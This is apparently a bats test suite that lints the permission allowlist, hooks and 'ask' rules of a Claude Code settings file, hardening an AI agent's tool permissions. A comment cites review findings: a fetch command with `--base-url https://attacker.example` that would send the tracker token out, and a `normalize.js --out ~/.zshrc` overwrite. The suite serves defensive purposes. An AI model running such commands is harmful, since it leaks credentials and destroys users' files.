#!/usr/bin/env bats
# Lint for .claude/settings.json — the file that wires the safety hooks and the
# permission allowlist. Two ways it has silently broken the harness:
#   1. Hook commands were relative ("bash hooks/prod-guard.sh"): run from any other
#      cwd (a headless/CI run), the hook never executes — Layers 2-4 silently absent.
#   2. Allowlist rules matched "curl -s -H ..." but the commands were changed to
#      "curl -fsS --max-time 30 ..." — every call became a permission prompt, which
#      deadlocks an unattended run.

REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/.." && pwd)"
SETTINGS="${QA_SETTINGS_FILE:-$REPO_ROOT/.claude/settings.json}"

@test "settings.json is valid JSON" {
  run jq -e . "$SETTINGS"
  [ "$status" -eq 0 ]
}

@test "every hook command resolves from \$CLAUDE_PROJECT_DIR, not the current directory" {
  bad=$(jq -r '.hooks[][].hooks[].command | select(contains("CLAUDE_PROJECT_DIR") | not)' "$SETTINGS")
  [ -z "$bad" ]
}

@test "every hook script referenced by settings.json exists" {
  while IFS= read -r cmd; do
    script=$(echo "$cmd" | grep -oE 'hooks/[A-Za-z0-9_./-]+\.sh' | head -1)
    [ -n "$script" ]
    [ -f "$REPO_ROOT/$script" ]
  done < <(jq -r '.hooks[][].hooks[].command' "$SETTINGS")
}

# Extract each curl command from the fenced bash blocks of the ticket-writing commands,
# joining "\" continuation lines, one command per line.
curl_commands() {
  awk '
    /^```bash/ { inblock=1; next }
    /^```/     { inblock=0; if (cmd != "") { print cmd; cmd="" } next }
    inblock {
      line=$0
      sub(/^[ \t]+/, "", line)
      if (cmd == "" && line !~ /^curl /) next
      if (line ~ /\\$/) { sub(/\\$/, "", line); cmd = cmd line " "; next }
      cmd = cmd line
      print cmd; cmd=""
    }
  ' "$@"
}

@test "any curl call that has an allowlist rule for its host still matches one (and no rule at all is fine once no command uses curl)" {
  # Hosts that were allowlisted before the -fsS/--max-time hardening. Azure (-u) was
  # never allowlisted and intentionally still prompts. So does GitLab: its host is configurable (self-hosted),
  # so no rule can name it, and a rule on "/api/v4/" alone would approve ANY host that has such a path.
  rules=()
  while IFS= read -r r; do rules+=("$r"); done < <(
    jq -r '.permissions.allow[] | select(startswith("Bash(curl")) | sub("^Bash\\("; "") | sub("\\)$"; "")' "$SETTINGS"
  )
  # (After the tracker adapters no command uses curl at all, so there may be no curl rules and nothing to match: that is the goal.)

  unmatched=""
  while IFS= read -r cmd; do
    case "$cmd" in
      *api.clickup.com*|*api.bitbucket.org*) ;;
      *) continue ;;
    esac
    matched=0
    for rule in "${rules[@]}"; do
      # shellcheck disable=SC2053
      if [[ "$cmd" == $rule ]]; then matched=1; break; fi
    done
    [ "$matched" -eq 1 ] || unmatched="${unmatched}${cmd}"$'\n'
  done < <(curl_commands "$REPO_ROOT"/.claude/commands/*.md)

  if [ -n "$unmatched" ]; then
    echo "curl commands with no matching allowlist rule (each becomes a permission prompt):"
    echo "$unmatched"
  fi
  [ -z "$unmatched" ]
}

@test "allowlist rules name the real API URL, so a string in a query or another host cannot satisfy them" {
  # `*api.clickup.com*` approved any command containing that text anywhere (a query string, another host's path).
  bad=$(jq -r '.permissions.allow[] | select(startswith("Bash(curl")) | select(test("https://api\\.(clickup\\.com|bitbucket\\.org)/") | not)' "$SETTINGS")
  if [ -n "$bad" ] && [ -f "$REPO_ROOT/docs/settings.proposed.json" ] && [ -z "${QA_SETTINGS_FILE:-}" ]; then
    # .claude/settings.json is write-protected for the agent that prepared the fix, so the fix waits in docs/ for a person to apply:
    #   cp docs/settings.proposed.json .claude/settings.json && rm docs/settings.proposed.json
    skip "broad curl rules still in .claude/settings.json — apply docs/settings.proposed.json (this test is enforced once it is removed)"
  fi
  [ -z "$bad" ] || { echo "curl rules that do not anchor on https://<host>/ :"; echo "$bad"; false; }
}

# ── flags that move a credential or write a file ────────────────────────────────────────────────────────────────
# The allowlist approves whole families of commands with a trailing wildcard (`cli.js fetch *`). A flag inside that family can send the tracker's token
# to a host of the caller's choosing (--base-url, or a --config that names one) or overwrite any file (--out, --context-file). Those flags are
# never needed by the pipeline's own commands, so each is covered by an "ask" rule, which is checked before "allow": the command still works, but
# the person sees it first. (A review found `cli.js fetch X --base-url https://attacker.example` and `normalize.js r --out ~/.zshrc` ran unprompted.)
PROPOSED="$REPO_ROOT/docs/settings.proposed.json"
REQUIRED_ASK=(
  'tracker/cli.js*--base-url*' 'tracker/cli.js*--config*' 'tracker/post-tests.js*--base-url*' 'tracker/post-tests.js*--config*'
  'results/normalize.js*--out*' 'tracker/cli.js*--context-file /*' 'tracker/cli.js*--context-file ~*' 'tracker/cli.js*--context-file*..*'
)
missing_ask() { # <settings file> -> prints every required fragment that no "ask" rule contains
  local rules frag
  rules=$(jq -r '(.permissions.ask // [])[]' "$1")
  for frag in "${REQUIRED_ASK[@]}"; do grep -qF -- "$frag" <<<"$rules" || echo "$frag"; done
}

@test "the proposed settings ask before any allowed command redirects a token or writes elsewhere" {
  run missing_ask "$PROPOSED"
  [ -z "$output" ]
}

@test "the ACTIVE settings.json asks too (apply docs/settings.proposed.json if this fails)" {
  run missing_ask "$SETTINGS"
  [ -z "$output" ]
}

@test "lint: a settings file that lacks the --base-url rule is caught" {
  jq '.permissions.ask |= map(select(contains("--base-url") | not))' "$PROPOSED" > "$BATS_TEST_TMPDIR/s.json"
  run missing_ask "$BATS_TEST_TMPDIR/s.json"
  [[ "$output" =~ "--base-url" ]]
}

@test "lint: a settings file that lacks the normalize --out rule is caught" {
  jq '.permissions.ask |= map(select(contains("--out") | not))' "$PROPOSED" > "$BATS_TEST_TMPDIR/s.json"
  run missing_ask "$BATS_TEST_TMPDIR/s.json"
  [[ "$output" =~ "--out" ]]
}

@test "lint: a settings file with no ask rules at all is caught" {
  jq 'del(.permissions.ask)' "$PROPOSED" > "$BATS_TEST_TMPDIR/s.json"
  run missing_ask "$BATS_TEST_TMPDIR/s.json"
  [ "$(echo "$output" | wc -l | tr -d ' ')" -eq "${#REQUIRED_ASK[@]}" ]
}

# A new option on one of these scripts could be another way to redirect a credential or write a file. This fails until someone has looked at it and
# either added an ask rule above or listed it as harmless here.
@test "the allowed scripts take only options that have been reviewed" {
  check() { # <script> <known options...>
    local script="$1"; shift
    local found; found=$(grep -oE "flag === '--[a-z-]+'" "$REPO_ROOT/$script" | grep -oE -- '--[a-z-]+' | sort -u)
    local opt
    for opt in $found; do case " $* " in *" $opt "*) ;; *) echo "$script: unreviewed option $opt"; return 1 ;; esac; done
  }
  check scripts/tracker/cli.js --base-url --config --context-file --input --input-file --source --stdin --timeout-ms
  check scripts/tracker/post-tests.js --base-url --cases --config --dry-run --keys-file --only --parent --source --timeout-ms
  check scripts/results/normalize.js --format --framework --out
}
